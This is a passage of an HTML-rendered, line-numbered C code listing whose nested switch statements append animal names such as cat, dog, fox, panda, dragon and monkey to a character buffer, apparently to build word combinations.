operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>                  <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> iii<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>iii<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>iii<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>                    <span class=\"token keyword\">int</span> len<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>                <span class=\"token keyword\">char</span>    hexbuf<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>                    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"226\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"227\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"228\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"229\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"230\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"231\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"232\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"233\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"234\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"235\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"236\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"237\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"238\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"239\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"240\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"241\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"242\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"243\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"244\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"245\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"246\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"247\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"248\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"249\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"250\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"251\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"252\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"253\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"254\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"255\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"256\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"257\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"258\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"259\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"260\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"261\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"262\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"263\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"264\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"265\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"266\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"267\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"268\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"269\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"270\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"271\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"272\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"273\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"274\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"275\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"276\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"277\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"278\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"279\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"280\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"281\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"282\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"283\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"284\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"285\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"286\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"287\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"288\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"289\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"290\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"291\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"292\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"293\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"294\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"295\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"296\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"297\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"298\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"299\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"300\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"301\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"302\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"303\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"304\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"305\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"306\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"307\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"308\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"309\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"310\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"311\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"312\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"313\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"314\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"315\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"316\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"317\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"318\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"319\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"320\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"321\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"322\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"323\"></td><td><pre>            